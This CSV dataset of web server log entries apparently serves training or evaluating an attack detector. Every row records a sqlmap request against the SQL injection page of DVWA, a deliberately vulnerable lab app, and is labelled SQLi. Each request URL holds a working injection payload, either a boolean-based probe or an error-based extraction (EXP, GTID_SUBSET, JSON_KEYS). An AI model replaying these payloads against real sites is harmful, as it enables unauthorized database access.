ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%60%29%20WHERE%203649%3D3649%20AND%208186%3D8317%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%60%29%20WHERE%203649%3D3649%20AND%208186%3D8317%23&Submit=Submit,HTTP/1.1,111,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%60%29%20WHERE%209780%3D9780%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%60%29%20WHERE%209780%3D9780%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,111,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9477&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9477&Submit=Submit,HTTP/1.1,63,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-8370%27%29%20OR%205307%3D2413%23&Submit=Submit HTTP/1.1,200,656,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-8370%27%29%20OR%205307%3D2413%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-8310%27%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,653,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-8310%27%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9844%27%20OR%205288%3D8894%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9844%27%20OR%205288%3D8894%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6744%27%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1727,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6744%27%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7675%27%20OR%203139%3D5265%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7675%27%20OR%203139%3D5265%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-2304%27%20qqLZnHxvXZ%23&Submit=Submit HTTP/1.1,200,652,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-2304%27%20qqLZnHxvXZ%23&Submit=Submit,HTTP/1.1,82,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7812%22%20OR%204647%3D5580%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7812%22%20OR%204647%3D5580%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-8188%22%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-8188%22%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9228%27%29%29%20OR%205866%3D8610%23&Submit=Submit HTTP/1.1,200,657,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9228%27%29%29%20OR%205866%3D8610%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9276%27%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,654,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9276%27%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3593%27%29%29%29%20OR%203448%3D6911%23&Submit=Submit HTTP/1.1,200,657,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3593%27%29%29%29%20OR%203448%3D6911%23&Submit=Submit,HTTP/1.1,97,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-1397%27%29%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,655,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-1397%27%29%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,97,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-4437%25%27%20OR%209543%3D8566%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-4437%25%27%20OR%209543%3D8566%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-1237%25%27%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1728,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-1237%25%27%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-1334%25%27%20OR%204809%3D5817%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-1334%25%27%20OR%204809%3D5817%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-1116%25%27%20qqLZnHxvXZ%23&Submit=Submit HTTP/1.1,200,652,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-1116%25%27%20qqLZnHxvXZ%23&Submit=Submit,HTTP/1.1,85,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3121%22%29%20OR%205275%3D2711%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3121%22%29%20OR%205275%3D2711%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-2591%22%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-2591%22%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3447%22%29%29%20OR%204567%3D5940%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3447%22%29%29%20OR%204567%3D5940%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-4563%22%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-4563%22%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7776%22%29%29%29%20OR%207401%3D8607%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7776%22%29%29%29%20OR%207401%3D8607%23&Submit=Submit,HTTP/1.1,97,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6171%22%29%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6171%22%29%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,97,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-2905%27%29%29%20AS%20qRus%20WHERE%206840%3D6840%20OR%206724%3D6916%23&Submit=Submit HTTP/1.1,200,675,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-2905%27%29%29%20AS%20qRus%20WHERE%206840%3D6840%20OR%206724%3D6916%23&Submit=Submit,HTTP/1.1,128,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6804%27%29%29%20AS%20NPaN%20WHERE%207617%3D7617%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,674,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6804%27%29%29%20AS%20NPaN%20WHERE%207617%3D7617%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,128,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3081%22%29%29%20AS%20xjGJ%20WHERE%201664%3D1664%20OR%207215%3D1600%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3081%22%29%29%20AS%20xjGJ%20WHERE%201664%3D1664%20OR%207215%3D1600%23&Submit=Submit,HTTP/1.1,128,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6617%22%29%29%20AS%20EbfM%20WHERE%202618%3D2618%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6617%22%29%29%20AS%20EbfM%20WHERE%202618%3D2618%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,128,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7041%27%29%20AS%20zSIO%20WHERE%202267%3D2267%20OR%207161%3D7331%23&Submit=Submit HTTP/1.1,200,675,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7041%27%29%20AS%20zSIO%20WHERE%202267%3D2267%20OR%207161%3D7331%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9153%27%29%20AS%20KNDN%20WHERE%202195%3D2195%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,674,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9153%27%29%20AS%20KNDN%20WHERE%202195%3D2195%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3337%22%29%20AS%20JAiK%20WHERE%202689%3D2689%20OR%208689%3D4677%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3337%22%29%20AS%20JAiK%20WHERE%202689%3D2689%20OR%208689%3D4677%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3112%22%29%20AS%20MZvR%20WHERE%207901%3D7901%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3112%22%29%20AS%20MZvR%20WHERE%207901%3D7901%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3016%29%20OR%209325%3D9139%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3016%29%20OR%209325%3D9139%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6678%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6678%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-8600%29%29%20OR%204342%3D8127%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-8600%29%29%20OR%204342%3D8127%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-2501%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-2501%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7620%29%29%29%20OR%207897%3D1865%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7620%29%29%29%20OR%207897%3D1865%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7036%29%29%29%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7036%29%29%29%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-3794%20OR%209902%3D8586%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-3794%20OR%209902%3D8586%23&Submit=Submit,HTTP/1.1,85,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-6840%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-6840%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,85,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-8507%29%29%20AS%20PubM%20WHERE%205812%3D5812%20OR%206833%3D6863%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-8507%29%29%20AS%20PubM%20WHERE%205812%3D5812%20OR%206833%3D6863%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-7546%29%29%20AS%20jjtW%20WHERE%202995%3D2995%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-7546%29%29%20AS%20jjtW%20WHERE%202995%3D2995%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,125,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-9254%29%20AS%20rrSx%20WHERE%205770%3D5770%20OR%203057%3D2914%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-9254%29%20AS%20rrSx%20WHERE%205770%3D5770%20OR%203057%3D2914%23&Submit=Submit,HTTP/1.1,122,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=-1774%29%20AS%20pmLi%20WHERE%208323%3D8323%20OR%204794%3D4794%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=-1774%29%20AS%20pmLi%20WHERE%208323%3D8323%20OR%204794%3D4794%23&Submit=Submit,HTTP/1.1,122,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20OR%20NOT%202389%3D1052%23&Submit=Submit HTTP/1.1,200,660,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20OR%20NOT%202389%3D1052%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20OR%20NOT%202234%3D2234%23&Submit=Submit HTTP/1.1,200,657,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20OR%20NOT%202234%3D2234%23&Submit=Submit,HTTP/1.1,94,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%201386%3D4628%23&Submit=Submit HTTP/1.1,200,1729,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%201386%3D4628%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%202234%3D2234%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%202234%3D2234%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%204874%3D8798%23&Submit=Submit HTTP/1.1,200,1729,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%204874%3D8798%23&Submit=Submit,HTTP/1.1,91,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%281369%3D1369%2C1%29%29%29%2C0x716a707171%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20lnkz&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%281369%3D1369%2C1%29%29%29%2C0x716a707171%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20lnkz&Submit=Submit,HTTP/1.1,302,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286417%3D6417%2C1%29%29%29%2C0x716a707171%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20YjIy&Submit=Submit HTTP/1.1,200,619,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286417%3D6417%2C1%29%29%29%2C0x716a707171%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20YjIy&Submit=Submit,HTTP/1.1,301,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286287%3D6287%2C1%29%29%29%2C0x716a707171%2C0x78%29%29x%29%29--%20dBKJ&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286287%3D6287%2C1%29%29%29%2C0x716a707171%2C0x78%29%29x%29%29--%20dBKJ&Submit=Submit,HTTP/1.1,229,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286483%3D6483%2C1%29%29%29%2C0x716a707171%2C0x78%29%29x%29%29--%20VjxI&Submit=Submit HTTP/1.1,200,594,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%286483%3D6483%2C1%29%29%29%2C0x716a707171%2C0x78%29%29x%29%29--%20VjxI&Submit=Submit,HTTP/1.1,228,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20GTID_SUBSET%28CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%282628%3D2628%2C1%29%29%29%2C0x716a707171%29%2C2628%29--%20lPDx&Submit=Submit HTTP/1.1,200,586,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20GTID_SUBSET%28CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%282628%3D2628%2C1%29%29%29%2C0x716a707171%29%2C2628%29--%20lPDx&Submit=Submit,HTTP/1.1,192,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20GTID_SUBSET%28CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%287906%3D7906%2C1%29%29%29%2C0x716a707171%29%2C7906%29--%20XcUa&Submit=Submit HTTP/1.1,200,586,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20GTID_SUBSET%28CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%287906%3D7906%2C1%29%29%29%2C0x716a707171%29%2C7906%29--%20XcUa&Submit=Submit,HTTP/1.1,191,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:17-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%283373%3D3373%2C1%29%29%29%2C0x716a707171%29%29%20USING%20utf8%29%29%29--%20TAEs&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71766b7871%2C%28SELECT%20%28ELT%283373%3D3373%2C1%29%29%29%2C0x716a707171%29%29%20USING%20utf8%29%29%29--%20TAEs&Submit=Submit,HTTP/1.1,241,5,40,SQLi
